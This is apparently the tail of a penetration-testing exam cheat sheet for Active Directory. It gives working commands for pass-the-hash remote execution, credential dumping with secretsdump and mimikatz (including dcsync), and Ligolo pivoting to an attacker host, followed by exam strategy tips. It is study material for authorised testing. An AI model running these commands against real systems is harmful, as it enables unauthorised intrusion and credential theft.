evil-winrm -i TARGET -u user -H HASH
impacket-psexec domain.local/user:pass@TARGET
impacket-wmiexec domain.local/user:pass@TARGET
impacket-smbexec domain.local/user:pass@TARGET

# HASH DUMPING
impacket-secretsdump domain.local/user:pass@TARGET
crackmapexec smb TARGET -u admin -H HASH --sam
mimikatz: sekurlsa::logonpasswords
mimikatz: lsadump::dcsync /domain:domain.local /user:Administrator

# LIGOLO
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect KALI_IP:11601 -ignore-cert
sudo ip route add 192.168.10.0/24 dev ligolo
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## Mindset

If you crack a password and it's `Summer2023!`, immediately try `Summer2024!`, `Winter2024!`, `Company2024!`. People reuse patterns. One cracked password tells you the company's pattern and that pattern is almost always reused somewhere else.

Run BloodHound before deciding your attack path. Don't guess when BloodHound can show you the exact route. Mark every user you compromise as Owned and rerun "Shortest Paths from Owned Principals" — the map changes as you progress.

If psexec fails, check `(Pwn3d!)` in crackmapexec first. If it's not there, the user isn't local admin and psexec will fail no matter what. Try wmiexec or smbexec. If those also fail, find another path — that user doesn't have access to that machine.

Run certipy every time you get domain user credentials. The command is simple and when it works, DA is minutes away.

When you're stuck, don't stay on one attack for more than 30-45 minutes. Go back to enumeration. Check shares you haven't looked at. Check user descriptions in BloodHound. Check SYSVOL again. The answer is almost always something you haven't examined yet, not a technique you haven't tried.

Take screenshots constantly. Every time you compromise something new: `whoami` + `hostname` + `ipconfig`. You can't have too many screenshots. You absolutely can have too few when writing the report.

Write findings as you go. Every time you confirm a vulnerability, add it to the report immediately — command used, output, what it means, what the fix is. Don't wait until day five. The report is half your score.

On time: treat day one as OSINT and external attack. Day two as foothold and pivot setup. Days three and four as internal AD attacks through Domain Admin. Day five as cleanup, screenshots, and starting the report. Days six and seven as report only — polish, proofread, submit.